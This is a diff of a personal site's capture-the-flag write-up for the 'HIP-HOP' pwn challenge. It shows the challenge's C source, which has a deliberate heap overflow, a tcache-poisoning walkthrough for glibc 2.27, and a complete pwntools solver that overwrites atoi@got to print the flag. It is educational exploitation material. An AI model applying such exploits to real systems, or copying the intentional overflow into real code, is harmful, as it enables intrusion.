@@ -1,360 +1,156 @@
-<!DOCTYPE html>
-<html lang="en">
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>HIP-HOP // r3t0x</title>
-    <link rel="icon" href="/static/img/favicon.svg" type="image/svg+xml">
-    <meta name="description" content="">
-    <link rel="stylesheet" href="../../../../static/css/style.css?v=43fea522e0ce">
-</head>
-<body>
-    <!-- Genjutsu Transition Overlay -->
-    <div class="genjutsu-overlay initial-closed" id="genjutsuOverlay">
-        <div class="eyelid eyelid-top"></div>
-        <div class="eyelid eyelid-bottom"></div>
-        <div class="genjutsu-eye">
-                <svg viewBox="0 0 200 200">
-                    <circle cx="100" cy="100" r="94" fill="var(--blood-red)" stroke="#000" stroke-width="10"/>
-                    <!-- Base 3-Tomoe -->
-                    <g class="base-sharingan" style="transform-origin: 100px 100px;">
-                        <circle cx="100" cy="100" r="90" fill="var(--blood-red)"/>
-                        <circle cx="100" cy="100" r="16" fill="#000"/>
-                        <circle cx="100" cy="100" r="55" fill="none" stroke="#000" stroke-width="2" stroke-dasharray="8 6"/>
-                        <g class="tomoe"><path d="M100,45 Q125,55 100,100" fill="none" stroke="#000" stroke-width="12" stroke-linecap="round"/></g>
-                        <g class="tomoe" style="transform-origin: 100px 100px; transform: rotate(120deg);"><path d="M100,45 Q125,55 100,100" fill="none" stroke="#000" stroke-width="12" stroke-linecap="round"/></g>
-                        <g class="tomoe" style="transform-origin: 100px 100px; transform: rotate(240deg);"><path d="M100,45 Q125,55 100,100" fill="none" stroke="#000" stroke-width="12" stroke-linecap="round"/></g>
-                    </g>
-                    <!-- Uploaded Image Mangekyo -->
-                    <defs>
-                        <clipPath id="circleClip">
-                            <circle cx="100" cy="100" r="98" />
-                        </clipPath>
-                    </defs>
-                    <image href="../../../../static/img/mangekyou.png" x="0" y="0" height="200" width="200" class="mangekyo" style="transform-origin: 100px 100px; opacity: 0; clip-path: url(#circleClip);" />
-                </svg>
-        </div>
-    </div>
-    <div class="scanlines"></div>
-    <div class="scroll-indicator" id="scrollIndicator"></div>
-    <div class="scroll-addr" id="scrollAddr">0x00000000</div>
-    <div class="pwndbg-bg" id="pwndbgBg"></div>
-
-    <div class="container" style="gap: 40px;">
-
-        <a href="../../../../index.html" class="back-link">← pwndbg> back</a>
-
-        <div class="chall-header">
-            <h1><span class="prefix">./</span>HIP-HOP<span class="cursor-blink">_</span></h1>
-            <div class="chall-meta-row">
-                <span class="tag">PWN</span>
-                <span>MOJO-JOJO CTF</span>
-                <span>0x48cae02c</span>
-                
-                
-                <span>
-                    <span class="difficulty">
-                        
-                        <span class="diff-dot filled"></span>
-                        
-                        <span class="diff-dot filled"></span>
-                        
-                        <span class="diff-dot filled"></span>
-                        
-                        <span class="diff-dot "></span>
-                        
-                        <span class="diff-dot "></span>
-                        
-                    </span>
-                </span>
-            </div>
-        </div>
-
-        <!-- Description -->
-        <div class="pwndbg-section">
-            <div class="pwndbg-title">DESCRIPTION</div>
-            <div class="code-block">
-                
-            </div>
-        </div>
-
-
-
-        
-        <!-- Source Code / Disasm -->
-        <div class="pwndbg-section">
-            <div class="pwndbg-title">DISASM // SOURCE</div>
-            
-            <div style="color: var(--amber); margin-bottom: 8px; font-size: 0.9rem;">// hiphop.c</div>
-            <div class="code-block" style="max-height: 500px; overflow-y: auto;">
-                <pre style="margin: 0; padding: 0; background: none; border: none;">#include &lt;stdio.h&gt;
-#include &lt;stdlib.h&gt;
-#include &lt;string.h&gt;
-#include &lt;unistd.h&gt;
-
-#define LYRIC_SIZE 0x100
-#define MAX_TRACKS 10
-
-// ANSI color codes
-#define RST   &#34;\033[0m&#34;
-#define BLD   &#34;\033[1m&#34;
-#define CYN   &#34;\033[36m&#34;
-#define MAG   &#34;\033[35m&#34;
-#define WHT   &#34;\033[37m&#34;
-#define BCYN  &#34;\033[96m&#34;
-#define BMAG  &#34;\033[95m&#34;
-#define BGRN  &#34;\033[92m&#34;
-#define BYLW  &#34;\033[93m&#34;
-#define YLW   &#34;\033[33m&#34;
-#define DIM   &#34;\033[2m&#34;
-
-// Secure centralized storage
-struct studio_t {
-    char isolation1[4096];
-    void *tracks[MAX_TRACKS];
-    char isolation2[4096];
-} __attribute__((aligned(64)));
-
-struct studio_t studio = {.isolation1 = {1}, .isolation2 = {1}};
-
-void banner() {
-    printf(&#34;\n&#34;);
-    printf(BLD BMAG &#34;    ██╗  ██╗██╗██████╗     ██╗  ██╗ ██████╗ ██████╗ \n&#34; RST);
-    printf(BLD MAG  &#34;    ██║  ██║██║██╔══██╗    ██║  ██║██╔═══██╗██╔══██╗\n&#34; RST);
-    printf(BLD BCYN &#34;    ███████║██║██████╔╝    ███████║██║   ██║██████╔╝\n&#34; RST);
-    printf(BLD CYN  &#34;    ██╔══██║██║██╔═══╝     ██╔══██║██║   ██║██╔═══╝ \n&#34; RST);
-    printf(BLD BYLW &#34;    ██║  ██║██║██║         ██║  ██║╚██████╔╝██║     \n&#34; RST);
-    printf(BLD YLW  &#34;    ╚═╝  ╚═╝╚═╝╚═╝         ╚═╝  ╚═╝ ╚═════╝ ╚═╝     \n&#34; RST);
-    printf(DIM WHT  &#34;              [ S T U D I O   M A N A G E R ]\n&#34; RST);
-    printf(&#34;\n&#34;);
-}
-
-void mic_check() {
-    asm(&#34;nop; nop; nop; nop;&#34;);
-    printf(BLD BGRN &#34;\n[+] Master Access Token Accepted!\n&#34; RST);
-    printf(CYN &#34;    Retrieving secret flag...\n&#34; RST);
-    system(&#34;/bin/cat flag.txt&#34;);
-    exit(0);
-}
-
-int get_int() {
-    char buf[16];
-    if (fgets(buf, 15, stdin) == NULL) return -1;
-    return atoi(buf);
-}
-
-void add_track() {
-    int i;
-    for (i = 0; i &lt; MAX_TRACKS; i++) if (studio.tracks[i] == NULL) break;
-    if (i == MAX_TRACKS) return;
-    studio.tracks[i] = malloc(LYRIC_SIZE);
-    printf(BGRN &#34;[+] &#34; WHT &#34;Track &#34; BYLW &#34;%d&#34; WHT &#34; loaded at %p\n&#34; RST, i, studio.tracks[i]);
-}
-
-void delete_track() {
-    printf(CYN &#34;[?] &#34; WHT &#34;Idx: &#34; RST);
-    int idx = get_int();
-    if (idx &lt; 0 || idx &gt;= MAX_TRACKS || studio.tracks[idx] == NULL) return;
-    free(studio.tracks[idx]);
-    studio.tracks[idx] = NULL;
-    printf(YLW &#34;[*] &#34; WHT &#34;Dropped\n&#34; RST);
-}
-
-void edit_lyrics() {
-    printf(CYN &#34;[?] &#34; WHT &#34;Idx: &#34; RST);
-    int idx = get_int();
-    if (idx &lt; 0 || idx &gt;= MAX_TRACKS || studio.tracks[idx] == NULL) return;
-    printf(CYN &#34;[&gt;] &#34; WHT &#34;Lyrics: &#34; RST);
-    // Large enough overflow for Tcache Poisoning
-    read(0, studio.tracks[idx], LYRIC_SIZE + 0x24); 
-    printf(BGRN &#34;[+] &#34; WHT &#34;Recorded\n&#34; RST);
-}
-
-int main() {
-    setvbuf(stdout, NULL, _IONBF, 0);
-    setvbuf(stdin, NULL, _IONBF, 0);
-    banner();
-    printf(DIM WHT &#34;[*] Console ready at &#34; BCYN &#34;0x%zx&#34; RST &#34;\n&#34;, (size_t)&amp;studio.tracks);
-    while (1) {
-        printf(&#34;\n 1.Add 2.Drop 3.Edit 4.Exit &gt;&gt; &#34;);
-        int choice = get_int();
-        if (choice == 1) add_track();
-        else if (choice == 2) delete_track();
-        else if (choice == 3) edit_lyrics();
-        else if (choice == 4) break;
-    }
-    return 0;
-}
-</pre>
-            </div>
-            
-        </div>
-        
-
-        
-        <!-- Writeup -->
-        <div class="pwndbg-section">
-            <div class="pwndbg-title">WRITEUP // WALKTHROUGH</div>
-            <div class="writeup-content">
-                <h1>Walkthrough: Hip-Hop Studio Manager</h1>
-<p>The <strong>Hip-Hop Studio Manager</strong> challenge is a modern heap exploitation task targeting <strong>glibc 2.27</strong> (Ubuntu 18.04). The goal is to leverage a heap overflow to perform a <strong>Tcache Poisoning</strong> attack and gain arbitrary write, ultimately overwriting a Global Offset Table (GOT) entry to redirect execution to a "debug" function that prints the flag.</p>
-<h2>Challenge Overview</h2>
+<!doctype html><html lang="en"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1"><meta name="theme-color" content="#0b0b0e"><title>HIP-HOP · Pwn writeup — r3t0x</title><meta name="description" content="MOJO-JOJO CTF binary-exploitation writeup."><link rel="canonical" href="https://ghaith-amdouni.github.io/challenge/mojo-jojo/pwn/HIP-HOP/"><meta property="og:type" content="article"><meta property="og:title" content="HIP-HOP · Pwn writeup — r3t0x"><meta property="og:description" content="MOJO-JOJO CTF binary-exploitation writeup."><meta property="og:url" content="https://ghaith-amdouni.github.io/challenge/mojo-jojo/pwn/HIP-HOP/"><meta property="og:image" content="https://ghaith-amdouni.github.io/static/img/social-card.png"><meta name="twitter:card" content="summary_large_image"><link rel="icon" href="/static/img/favicon.svg" type="image/svg+xml"><link rel="alternate" type="application/rss+xml" title="r3t0x journal" href="/feed.xml"><link rel="stylesheet" href="/static/css/site.css?v=35a79a2faa7b"><link rel="stylesheet" href="/static/css/akatsuki.css?v=35a79a2faa7b"><script src="/static/js/site.js?v=35a79a2faa7b" defer></script></head><body>
+  <a class="skip" href="#main">Skip to content</a><div class="reading-progress" aria-hidden="true"></div>
+  <div class="systembar"><div><span class="arch-mini" aria-hidden="true">Λ</span> archlinux <span class="bar-sep">/</span> r3t0x@portfolio <span class="system-workspaces" aria-hidden="true"><b>01</b> 02 03</span></div><div><span class="online-dot"></span> ALL SYSTEMS NOMINAL <span class="bar-sep">/</span> <time id="clock">UTC</time></div></div>
+  <header class="site-header"><a class="brand" href="/" aria-label="r3t0x home"><img class="brand-eye" src="/static/img/mangekyou.png" alt="" width="32" height="32"><span>r3t0x<span class="muted">@arch</span></span></a><nav aria-label="Main navigation"><a href="/" >~/home</a><a href="/blog/" aria-current="page">~/archive</a><a href="/projects/" >~/projects</a><a href="/static/docs/Ghaith-Amdouni-CV-English.pdf" download>CV ↓</a></nav><button class="search-trigger" data-open-search aria-label="Search site"><span>⌕</span><kbd>Ctrl K</kbd></button></header>
+  <div class="archive-transition" id="archive-transition" aria-hidden="true"><div class="route-eyelid route-eyelid-top"></div><div class="route-eyelid route-eyelid-bottom"></div><div class="vault-coordinates"><span>00:00:01</span><span>0x00401337</span></div><div class="vault-eye"><span class="vault-symbol"></span><span class="vault-reticle"></span><i></i><i></i><i></i></div><div class="vault-caption"><p><small>TSUKUYOMI ROUTE SHIFT</small><b id="transition-label">ENTERING THE MEMORY VAULT</b><span id="transition-address">~/archive</span></p></div></div>
+  <div class="ambient-clouds" aria-hidden="true"><svg class="akatsuki-cloud" viewBox="0 0 160 100" aria-hidden="true"><path d="M34 78C9 80 6 52 28 47C20 24 47 13 63 28C75 3 112 12 113 37C138 27 158 51 143 69C135 79 119 80 108 76C104 91 81 91 73 79C62 89 42 91 34 78Z"/><path class="cloud-whorl" d="M28 47C52 41 68 52 62 65C57 76 39 72 41 62M113 37C93 36 85 47 90 59"/></svg><svg class="akatsuki-cloud" viewBox="0 0 160 100" aria-hidden="true"><path d="M34 78C9 80 6 52 28 47C20 24 47 13 63 28C75 3 112 12 113 37C138 27 158 51 143 69C135 79 119 80 108 76C104 91 81 91 73 79C62 89 42 91 34 78Z"/><path class="cloud-whorl" d="M28 47C52 41 68 52 62 65C57 76 39 72 41 62M113 37C93 36 85 47 90 59"/></svg></div><div class="scroll-address" aria-hidden="true"><b>RIP</b><span id="scroll-address">0x00000000</span><i><em></em></i><small>PTR</small></div><main id="main"><article class="wrap article-page writeup-page">
+    <a class="text-link" href="/blog/?collection=MOJO-JOJO%20CTF">← Back to the archive</a>
+    <header class="article-heading"><p class="eyebrow">MOJO-JOJO CTF <span>/</span> Pwn WRITEUP</p><h1>HIP-HOP</h1><p>MOJO-JOJO CTF binary-exploitation writeup.</p>
+      <div class="article-author"><img src="/static/img/ghaith.webp" alt="" width="44" height="44"><span><strong>r3t0x</strong><small>2026-09-28 · archived challenge · medium</small></span><a class="button" href="#solver">Jump to solver ↓</a></div>
+    </header>
+    <div class="writeup-facts" aria-label="Challenge metadata"><span><small>EVENT</small>MOJO-JOJO CTF</span><span><small>CATEGORY</small>Pwn</span><span><small>DIFFICULTY</small>medium</span><span><small>POINTS</small>Archived</span></div>
+    <div class="writeup-tags"><span>pwn</span></div>
+    <div class="article-layout">
+      <div class="prose writeup-prose"><h2 id="summary">Summary</h2><p class="lead">MOJO-JOJO CTF binary-exploitation writeup.</p><h2 id="walkthrough">Walkthrough</h2><p>The <strong>Hip-Hop Studio Manager</strong> challenge is a modern heap exploitation task targeting <strong>glibc 2.27</strong> (Ubuntu 18.04). The goal is to leverage a heap overflow to perform a <strong>Tcache Poisoning</strong> attack and gain arbitrary write, ultimately overwriting a Global Offset Table (GOT) entry to redirect execution to a "debug" function that prints the flag.</p>
+<h3>Challenge Overview</h3>
 <ul>
 <li><strong>Vulnerability</strong>: Heap overflow in the <code>edit_lyrics</code> function.</li>
 <li><strong>Constraint</strong>: The binary uses <strong>Partial RELRO</strong>, which leaves the <code>.got.plt</code> section writable.</li>
 <li><strong>Protection</strong>: PIE, NX, and Stack Canaries are enabled.</li>
 <li><strong>Target</strong>: Overwrite <code>atoi@got</code> with the address of the <code>mic_check</code> function.</li>
 </ul>
-<h2>Exploit Strategy: Tcache Poisoning</h2>
-<h3>1. Leak and Reconnaissance</h3>
+<h3>Exploit Strategy: Tcache Poisoning</h3>
+<h4>1. Leak and Reconnaissance</h4>
 <p>The binary conveniently prints the address of the <code>tracks</code> array in the BSS at startup. This allows us to calculate the binary base address and find the exact location of <code>atoi@got</code> and <code>mic_check</code>.</p>
-<h3>2. Heap Setup</h3>
+<h4>2. Heap Setup</h4>
 <p>We allocate two chunks of the same size (<code>0x110</code> including headers). We then free the second chunk (<code>idx1</code>) to the tcache.</p>
 <div class="codehilite"><pre><span></span><code><span class="n">add</span><span class="p">()</span> <span class="c1"># idx 0</span>
 <span class="n">add</span><span class="p">()</span> <span class="c1"># idx 1</span>
 <span class="n">delete</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span> <span class="c1"># Free to tcache</span>
 </code></pre></div>
 
-<h3>3. Tcache Poisoning</h3>
+<h4>3. Tcache Poisoning</h4>
 <p>Using the overflow in <code>idx0</code>, we overwrite the <code>next</code> pointer of the freed <code>idx1</code> chunk with the address of <code>atoi@got</code>.</p>
 <div class="codehilite"><pre><span></span><code><span class="n">payload</span> <span class="o">=</span> <span class="sa">b</span><span class="s1">&#39;A&#39;</span> <span class="o">*</span> <span class="mh">0x100</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x111</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">atoi_got</span><span class="p">)</span>
 <span class="n">edit</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="n">payload</span><span class="p">)</span>
 </code></pre></div>
 
-<h3>4. Arbitrary Write</h3>
+<h4>4. Arbitrary Write</h4>
 <p>After poisoning the tcache, the next allocation of the same size will return the original heap chunk, but the allocation <em>after</em> that will return a pointer to <code>atoi@got</code>.</p>
 <div class="codehilite"><pre><span></span><code><span class="n">add</span><span class="p">()</span> <span class="c1"># Returns original idx 1</span>
 <span class="n">add</span><span class="p">()</span> <span class="c1"># Returns atoi@got!</span>
 </code></pre></div>
 
-<h3>5. GOT Overwrite and Trigger</h3>
+<h4>5. GOT Overwrite and Trigger</h4>
 <p>We use the newly acquired pointer to <code>atoi@got</code> to write the address of the <code>mic_check</code> function. Finally, sending a menu choice (like '1') triggers a call to <code>atoi</code>, which is now redirected to <code>mic_check</code>.</p>
-<h2>Solver Usage</h2>
+<h3>Solver Usage</h3>
 <p>The included <code>solve.py</code> uses the provided dynamic loader (<code>ld-linux-x86-64.so.2</code>) to ensure compatibility across different host systems:</p>
 <div class="codehilite"><pre><span></span><code><span class="n">process</span><span class="p">([</span><span class="s1">&#39;./dist/ld-linux-x86-64.so.2&#39;</span><span class="p">,</span> <span class="s1">&#39;--library-path&#39;</span><span class="p">,</span> <span class="s1">&#39;./dist&#39;</span><span class="p">,</span> <span class="s1">&#39;./dist/hiphop&#39;</span><span class="p">])</span>
 </code></pre></div>
 
-<h2>POC Result</h2>
+<h3>POC Result</h3>
 <p>The exploit successfully triggers the <code>mic_check</code> function and retrieves the flag:</p>
 <div class="codehilite"><pre><span></span><code>[+] Master Access Token Accepted!
     Retrieving secret flag...
 MOJO-JOJO{h3ap_p0is0n1ng_i5_v3ry_3asy_0n_2_27}
-</code></pre></div>
-            </div>
-        </div>
-        
-
-        
-        <!-- Exploit / Solver -->
-        <div class="pwndbg-section">
-            <div class="pwndbg-title">EXECUTION // EXPLOIT</div>
-            <div style="color: var(--text-muted); margin-bottom: 10px; font-size: 0.85rem;">
-                <span style="color: var(--gdb-green);">$</span> python3 solve.py
-            </div>
-            <div class="code-block" style="max-height: 600px; overflow-y: auto;">
-                <pre style="margin: 0; padding: 0; background: none; border: none;">#!/usr/bin/env python3
+</code></pre></div><h2 id="solver">Reference solver</h2><p>The complete solver used to validate the challenge:</p><pre><code class="language-python">#!/usr/bin/env python3
 from pwn import *
 import re
 
 # Context setup
-context.arch = &#39;amd64&#39;
-context.terminal = [&#39;tmux&#39;, &#39;splitw&#39;, &#39;-h&#39;]
+context.arch = 'amd64'
+context.terminal = ['tmux', 'splitw', '-h']
 
 # Use the loader to run the binary with the custom glibc
-binary_path = &#39;./dist/hiphop&#39;
-loader_path = &#39;./dist/ld-linux-x86-64.so.2&#39;
-libc_dir = &#39;./dist&#39;
+binary_path = './dist/hiphop'
+loader_path = './dist/ld-linux-x86-64.so.2'
+libc_dir = './dist'
 
 binary = ELF(binary_path, checksec=False)
 
 def strip_ansi(data):
-    return re.sub(rb&#39;\x1b\[[0-9;]*m&#39;, b&#39;&#39;, data).decode(&#39;ascii&#39;)
+    return re.sub(rb'\x1b\[[0-9;]*m', b'', data).decode('ascii')
 
 def start():
     if args.REMOTE:
-        return remote(&#39;localhost&#39;, 9008)
+        return remote('localhost', 9008)
     else:
         # Launch binary using the loader for maximum reliability
-        return process([loader_path, &#39;--library-path&#39;, libc_dir, binary_path])
+        return process([loader_path, '--library-path', libc_dir, binary_path])
 
 io = start()
 
 def add():
-    io.sendlineafter(b&#39; &gt;&gt; &#39;, b&#39;1&#39;)
+    io.sendlineafter(b' &gt;&gt; ', b'1')
     return
 
 def delete(idx):
-    io.sendlineafter(b&#39; &gt;&gt; &#39;, b&#39;2&#39;)
-    io.sendlineafter(b&#39;Idx: &#39;, str(idx).encode())
+    io.sendlineafter(b' &gt;&gt; ', b'2')
+    io.sendlineafter(b'Idx: ', str(idx).encode())
 
 def edit(idx, content):
-    io.sendlineafter(b&#39; &gt;&gt; &#39;, b&#39;3&#39;)
-    io.sendlineafter(b&#39;Idx: &#39;, str(idx).encode())
+    io.sendlineafter(b' &gt;&gt; ', b'3')
+    io.sendlineafter(b'Idx: ', str(idx).encode())
     # Overflow exactly into next chunk metadata
-    payload = content.ljust(0x100 + 0x20, b&#39;\x00&#39;)
-    io.sendafter(b&#39;Lyrics: &#39;, payload)
+    payload = content.ljust(0x100 + 0x20, b'\x00')
+    io.sendafter(b'Lyrics: ', payload)
 
 # 1. Leak and calculate offsets
-io.recvuntil(b&#39;[*] Console ready at \x1b[96m0x&#39;)
-tracks_addr = int(io.recvuntil(b&#39;\x1b&#39;, drop=True), 16)
-log.success(f&#34;Tracks at: {hex(tracks_addr)}&#34;)
+io.recvuntil(b'[*] Console ready at \x1b[96m0x')
+tracks_addr = int(io.recvuntil(b'\x1b', drop=True), 16)
+log.success(f&quot;Tracks at: {hex(tracks_addr)}&quot;)
 
 # Symbol tracks @ 0x2030c0
 binary.address = tracks_addr - 0x2030c0
-log.info(f&#34;Binary base: {hex(binary.address)}&#34;)
+log.info(f&quot;Binary base: {hex(binary.address)}&quot;)
 
 # 2. Tcache Poisoning
 add() # 0
 add() # 1
 
-log.info(&#34;Freeing idx1 to tcache...&#34;)
+log.info(&quot;Freeing idx1 to tcache...&quot;)
 delete(1)
 
-# Overwrite idx1&#39;s next pointer with atoi@got
-atoi_got = binary.got[&#39;atoi&#39;]
-mic_check = binary.symbols[&#39;mic_check&#39;]
-log.success(f&#34;Targeting atoi@got: {hex(atoi_got)}&#34;)
-log.success(f&#34;mic_check: {hex(mic_check)}&#34;)
+# Overwrite idx1's next pointer with atoi@got
+atoi_got = binary.got['atoi']
+mic_check = binary.symbols['mic_check']
+log.success(f&quot;Targeting atoi@got: {hex(atoi_got)}&quot;)
+log.success(f&quot;mic_check: {hex(mic_check)}&quot;)
 
 # idx0 -&gt; data area (0x100 bytes)
-payload = b&#39;A&#39; * 0x100
+payload = b'A' * 0x100
 payload += p64(0)
 payload += p64(0x111)
 payload += p64(atoi_got)
 
-log.info(&#34;Poisoning Tcache...&#34;)
+log.info(&quot;Poisoning Tcache...&quot;)
 edit(0, payload)
 
 # 3. Allocations to reach GOT
 add() # 1
 add() # 2
-log.success(&#34;Allocation 2 is at atoi@got!&#34;)
+log.success(&quot;Allocation 2 is at atoi@got!&quot;)
 
 # 4. Overwrite atoi@got
-log.info(&#34;Overwriting atoi@got...&#34;)
+log.info(&quot;Overwriting atoi@got...&quot;)
 edit(2, p64(mic_check))
 
-log.success(&#34;Triggering Shell (calling atoi)...&#34;)
-io.sendline(b&#39;1&#39;)
+log.success(&quot;Triggering Shell (calling atoi)...&quot;)
+io.sendline(b'1')
 
 # Capture flag
 flag_data = io.recvall(timeout=2)
-flag = re.search(r&#39;MOJO-JOJO\{.*?\}&#39;, flag_data.decode())
+flag = re.search(r'MOJO-JOJO\{.*?\}', flag_data.decode())
 if flag:
-    log.success(f&#34;Flag captured: {flag.group(0)}&#34;)
+    log.success(f&quot;Flag captured: {flag.group(0)}&quot;)
 else:
-    log.info(&#34;Raw output:\n&#34; + flag_data.decode())
-    log.error(&#34;Flag not found!&#34;)
+    log.info(&quot;Raw output:\n&quot; + flag_data.decode())
+    log.error(&quot;Flag not found!&quot;)
 
-io.close()
-</pre>
-            </div>
-        </div>
-        
-
-        <div style="height: 80px;"></div>
+io.close()</code></pre><h2 id="flag">Flag</h2><pre class="flag-output"><code>MOJO-JOJO{h3ap_p0is0n1ng_i5_v3ry_3asy_0n_2_27}</code></pre>
+      <div class="article-end"><span>Published 2026-09-28 · by r3t0x</span><a class="text-link" href="/blog/?collection=MOJO-JOJO%20CTF">More MOJO-JOJO CTF writeups ↗</a></div></div>
     </div>
-
-    <script src="../../../../static/js/main.js?v=43fea522e0ce"></script>
-</body>
-</html>
+  </article></main>
+  <footer class="site-footer"><div class="footer-top"><a class="brand" href="/"><img class="brand-eye" src="/static/img/mangekyou.png" alt="" width="32" height="32"><span>r3t0x<span class="muted">@arch</span></span></a><p>Always curious. Always one layer deeper.</p><a href="#main" class="text-link">Back to top ↑</a></div><div class="footer-bottom"><span>© 2026 Ghaith Amdouni <span class="red">·</span> Made with curiosity & caffeine.</span><div><a href="/projects/">Projects ↗</a><a href="https://github.com/Ghaith-amdouni">GitHub ↗</a><a href="https://www.linkedin.com/in/amdouni-ghaith">LinkedIn ↗</a><a href="/static/docs/Ghaith-Amdouni-CV-English.pdf" download>Résumé ↗</a><a href="/feed.xml">RSS ↗</a><button id="motion-toggle" aria-pressed="false">Motion: on</button></div></div></footer>
+  <dialog id="search-dialog" class="search-vault" aria-labelledby="search-title"><div class="search-vault-mark" aria-hidden="true"><span></span><small>眼 // TRACE</small></div><div class="dialog-top"><div><span class="dialog-address">0xSEARCH_INDEX</span><h2 id="search-title">Trace a memory.</h2></div><button data-close-dialog aria-label="Close search">ESC</button></div><label for="site-search" class="search-command"><span aria-hidden="true">❯</span><span class="sr-only">Search challenges, projects, and pages</span><input id="site-search" type="search" placeholder="type a challenge, project, primitive…" autocomplete="off" spellcheck="false"></label><div class="search-scopes" role="group" aria-label="Search scope"><button type="button" data-search-scope="All" aria-pressed="true">ALL MEMORY</button><button type="button" data-search-scope="Challenge" aria-pressed="false">CHALLENGES</button><button type="button" data-search-scope="Project" aria-pressed="false">PROJECTS</button></div><div class="search-readout"><span><i></i> INDEX ONLINE</span><b id="search-count">0 addresses</b></div><div id="search-results" aria-live="polite"></div><div class="dialog-bottom"><span>↑↓ TRACE</span><span>ENTER OPEN</span><span>ESC DISMISS</span></div></dialog>
+  <div class="toast" id="toast" role="status"></div></body></html>
